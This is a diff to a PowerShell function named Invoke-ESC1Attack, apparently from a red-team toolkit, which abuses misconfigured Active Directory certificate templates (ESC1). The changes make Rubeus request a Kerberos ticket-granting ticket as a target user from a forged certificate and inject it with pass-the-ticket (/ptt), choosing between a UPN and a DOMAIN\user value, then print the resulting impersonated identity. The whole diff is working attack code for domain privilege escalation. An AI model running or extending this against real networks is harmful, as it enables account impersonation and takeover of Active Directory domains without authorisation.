@@ -184,8 +184,12 @@ function Invoke-ESC1Attack {
         
         # Get domain information for SID construction
         $domainSid = $null
+        $netbiosDomain = $null
         try {
             $domain = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Domain
+            
+            # Get NetBIOS domain name using environment variable
+            $netbiosDomain = $env:USERDOMAIN
             
             # Get domain SID using DirectoryEntry
             $rootDSE = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
@@ -199,7 +203,7 @@ function Invoke-ESC1Attack {
                 $domainSid = $domainSidObject.Value
             }
             
-            Write-Verbose "Domain: $domain, Domain SID: $domainSid"
+            Write-Verbose "Domain: $domain, NetBIOS: $netbiosDomain, Domain SID: $domainSid"
         } catch {
             Write-Warning "Could not retrieve domain information: $($_.Exception.Message)"
         }
@@ -424,9 +428,12 @@ function Invoke-ESC1Attack {
                             Write-Host "[i] Using Rubeus to request TGT with certificate..." -ForegroundColor Cyan
                             
                             # Build Rubeus command arguments
+                            # Use UPN if available, otherwise use DOMAIN\username format
+                            $rubeusUserValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
+                            
                             $rubeusArgs = @(
                                 "asktgt"
-                                "/user:$targetName"
+                                "/user:$rubeusUserValue"
                                 "/certificate:$certificate"
                                 "/ptt"
                             )
@@ -442,6 +449,8 @@ function Invoke-ESC1Attack {
                             
                             if ($rubeusExitCode -eq 0) {
                                 Write-Host "[+] TGT successfully requested and applied!" -ForegroundColor Green
+                                Write-Host "[!] New user context: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Yellow
+                                
                             } else {
                                 Write-Warning "Rubeus failed with exit code $rubeusExitCode"
                             }
@@ -490,7 +499,7 @@ function Invoke-ESC1Attack {
             Write-Host "What if: Would save certificate to: $certFilePath" -ForegroundColor Yellow
             Write-Host "What if: Certify command: $CertifyPath $($certifyArgs -join ' ')" -ForegroundColor Yellow
             Write-Host "What if: Would use Rubeus to request TGT with certificate" -ForegroundColor Yellow
-            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$targetName /certificate:<cert> /ptt" -ForegroundColor Yellow
+            Write-Host "What if: Rubeus command: $RubeusPath asktgt /user:$($targetUPN ?? $targetNTAccount) /certificate:<cert> /ptt" -ForegroundColor Yellow
             
             return [PSCustomObject]@{
                 Success = $true
